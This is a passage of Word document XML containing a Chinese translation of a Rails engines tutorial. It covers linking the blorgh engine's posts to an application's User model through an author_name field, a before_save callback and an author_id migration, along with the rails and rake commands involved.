        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 前需要确认我们的应用程序会在将来使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2895288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同样，保持示例的简单，文章 ‘form’ 将会有一个名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 text field 在这里用户可以选择并且输入他们的名字。Engine 将会随后获取这个名字并且依据它创建一个新的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象或者找到一个存在的有相同名字的对象，然后关联文章和它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3FFC1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首先，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> text field 需要被添加到 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> partial。这里可以在添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>title</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 上方添加这个代码：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5FC80CC0" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AB6B14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&lt;div</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>class="field"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DBCEAF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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.label :author_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;br</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038E88E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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.text_field :author_name</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p w14:paraId="0E25EB7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&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="189E02A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接着 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘model’ 应该有一些代码来转换 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> field 到一个实际的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象并且在 文章保存之前关联它为文章的作者。这里也需要为这个 field 设置一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使得为它定义来 setter and getter 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D7D56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要这样做，你需要为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，作者的关系和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>before_save</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/blorgh/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关系将会被暂时硬编码到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="61416570" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7321732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attr_accessor :author_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="654B909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belongs_to :author, :class_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "User"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EF7963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1B4A011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before_save :set_author</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01188BA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25B327C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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="650A563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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>set_author</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="589A353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self.author = User.find_or_create_by_name(author_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EF7533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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24DD537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通过那样定义，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关系的对象被 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类代表一个在 engine 和应用程序的连接被建立。这需要一种方式来关联 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表中的记录和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表中的记录。因为关系被 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用，这里应该有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>author_id</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D753D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要创建这个这个新字段，在 engine 中运行这个命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="20BA0509" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34B862FB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1201436859"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails g migration add_author_id_to_blorgh_posts author_id:integer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B5FF98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因为迁移名和字段在他之后指定，Rails 将会自动知道你希望添加一个字段到一个指定的表并且为你将其写进迁移。你不需要在告诉它更多的消息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF52A1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这个迁移需要在应用程序中运行。要这样做，首先需要复制并使用这个命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="444F038F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="175C2047" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="932323443"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake blorgh:install:migrations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26484E8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注意这里仅仅只有 _一个_迁移被复制。这是因为开始的两个迁移已经在这个命令第一次运行的时候全部复制了。</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0F76688B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EF9791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NOTE Migration [timestamp]_create_blorgh_posts.rb from blorgh has been skipped. Migration with the same name already exists.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03A8593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NOTE Migration [timestamp]_create_blorgh_comments.rb from blorgh has been skipped. Migration with the same name already exists.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C72E98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Copied migration [timestamp]_add_author_id_to_blorgh_posts.rb from blorgh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C95577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运行这个迁移使用这个命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4E638972" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="18494833" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="705957471"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
